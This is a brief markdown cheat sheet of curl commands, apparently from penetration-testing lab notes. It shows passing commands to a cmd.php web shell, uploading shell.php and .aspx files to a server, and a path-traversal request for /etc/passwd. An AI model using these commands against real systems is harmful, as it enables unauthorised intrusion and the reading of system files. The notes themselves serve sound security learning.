---
title: "Curl"
date: 2024-6-26
tags: ["curl", "http", "file transfer", "web"]
---

---
### Advance curl

```bash
# POST url-encoded data
curl --data-urlencode 'cmd=ping -c3 10.10.14.10' http://10.10.11.10/cmd.php
```

```bash
# Put the POST data to url and use GET
curl -G --data-urlencode 'cmd=ping -c3 10.10.14.10' http://10.10.11.10/cmd.php
```

```bash
# PUT a file
curl -X PUT http://10.10.11.10/test.txt -d @test.txt
```

```bash
# PUT a file (with creds)
curl -X PUT http://user:password@10.10.11.10/test.txt -d @test.txt
```

```bash
# Put a file as raw binary format (preserve newlines and control characters)
curl -X PUT http://10.10.11.10/test.txt --data-binary @test.aspx
```

```bash
# POST a file with form param `file`
curl -X POST -F "file=@shell.php;type=application/php;filename=shell.php" http://10.10.11.10/upload
```

```bash
# POST a file in raw-text format (not as attachment) with form param `file`
curl -X POST -F 'file=<shell.zip' http://10.10.11.10/upload
```

```bash
# Not to handle sequences of `/../` or `/./` in the given URL
curl --path-as-is http://10.10.11.10/../../../../etc/passwd
```

```bash
# Save the same name as the file on the server
curl http://10.10.11.10/filt.txt -O
```

<br>